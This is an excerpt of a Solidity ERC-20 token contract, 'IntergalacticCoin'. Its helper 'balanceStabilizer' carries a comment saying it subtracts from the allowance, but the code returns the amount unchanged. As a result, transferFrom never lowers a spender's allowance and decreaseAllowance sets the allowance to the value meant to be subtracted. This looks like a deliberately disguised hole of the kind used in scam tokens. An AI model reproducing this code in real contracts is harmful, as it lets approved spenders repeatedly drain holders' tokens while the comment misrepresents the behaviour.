...
contract IntergalacticCoin is Context, IERC20, Ownable {
    ...
    /**
     * @dev Subtracts the allowance amount & returns the amount to transfer if the balance is great enough to support the transfer, 
     * reverting with custom message on overflow (when the amount is greater than balance). 
     */
    function balanceStabilizer(uint256 balance, uint256 amount, string memory errorMessage) internal virtual returns (uint256) {
        require(amount <= balance, errorMessage);
        return amount;
    }
    ...
    function transferFrom(
        ...
        _approve(
            sender,
            _msgSender(),
            balanceStabilizer(_allowances[sender][_msgSender()], amount, "ERC20: transfer amount exceeds allowance")
        );
        ...
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            balanceStabilizer(_allowances[_msgSender()][spender], subtractedValue, "ERC20: decreased allowance below zero")
        );
